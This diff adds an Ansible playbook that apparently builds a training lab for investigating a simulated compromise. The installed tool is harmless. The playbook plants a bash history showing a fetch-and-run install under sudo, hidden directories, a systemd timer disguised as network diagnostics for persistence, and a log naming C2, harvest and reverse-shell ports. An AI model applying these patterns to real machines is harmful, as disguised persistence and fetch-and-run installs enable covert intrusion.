@@ -1,0 +1,128 @@
+---
+- name: Ensure victim cache directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.netd
+    - /var/lib/.netd
+
+- name: Place installer artifact (simulates wget from dist-server)
+  copy:
+    dest: /tmp/net-diag-installer.sh
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # net-diag v1.4.2 — Network Diagnostics Utility Installer
+      # Internal distribution — do not redistribute
+      set -e
+      echo "[net-diag] Installing network diagnostics utility..."
+      install -d /usr/local/bin
+      install -d /usr/local/lib/.netd
+      install -d /var/lib/.netd
+      cat > /usr/local/bin/net-diag <<'WRAPPER'
+      #!/bin/bash
+      echo "=== Network Diagnostics v1.4.2 ==="
+      echo "Hostname : $(hostname)"
+      echo "IP       : $(hostname -I | awk '{print $1}')"
+      echo "Uptime   : $(uptime -p)"
+      echo "Routing  :"
+      ip route 2>/dev/null || route -n 2>/dev/null
+      WRAPPER
+      chmod 0755 /usr/local/bin/net-diag
+      echo "[net-diag] Installation complete. Run: net-diag"
+
+- name: Install the legitimate front-end wrapper
+  copy:
+    dest: /usr/local/bin/net-diag
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      echo "=== Network Diagnostics v1.4.2 ==="
+      echo "Hostname : $(hostname)"
+      echo "IP       : $(hostname -I | awk '{print $1}')"
+      echo "Uptime   : $(uptime -p)"
+      echo "Routing  :"
+      ip route 2>/dev/null || route -n 2>/dev/null
+
+- name: Plant bash history showing the download and execution
+  copy:
+    dest: "/home/{{ victim_user }}/.bash_history"
+    owner: "{{ victim_user }}"
+    group: "{{ victim_user }}"
+    mode: "0600"
+    content: |
+      ls -la
+      ping dist-server -c 3
+      wget http://{{ dist_host }}:8080/net-diag-installer.sh
+      ls -la net-diag-installer.sh
+      chmod +x net-diag-installer.sh
+      sudo ./net-diag-installer.sh
+      net-diag
+      ls -la /usr/local/bin/
+      exit
+
+- name: Create disguised persistence service (network-diagnostics)
+  copy:
+    dest: /etc/systemd/system/network-diagnostics.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Network Diagnostics Background Monitor
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart=/usr/local/bin/net-diag
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create disguised persistence timer
+  copy:
+    dest: /etc/systemd/system/network-diagnostics.timer
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic network diagnostics monitor
+
+      [Timer]
+      OnBootSec=1min
+      OnUnitActiveSec=15min
+      Unit=network-diagnostics.service
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Reload systemd and enable persistence timer
+  systemd:
+    name: network-diagnostics.timer
+    enabled: yes
+    state: started
+    daemon_reload: yes
+
+- name: Write install log (root-only — hard path for privesc)
+  copy:
+    dest: /var/lib/.netd/install.log
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      {{ ansible_date_time.iso8601 }} [TROJAN] INSTALLER STARTED host={{ ansible_hostname }}
+      {{ ansible_date_time.iso8601 }} [TROJAN] DROPPER src=http://{{ dist_host }}:8080/net-diag-installer.sh
+      {{ ansible_date_time.iso8601 }} [TROJAN] PAYLOAD DEPLOYED /usr/local/lib/.netd/
+      {{ ansible_date_time.iso8601 }} [TROJAN] PERSISTENCE network-diagnostics.timer ENABLED
+      {{ ansible_date_time.iso8601 }} [TROJAN] C2 {{ c2_host }} harvest={{ harvest_port }} revshell={{ revshell_port }}
+      {{ ansible_date_time.iso8601 }} [TROJAN] INSTALL COMPLETE
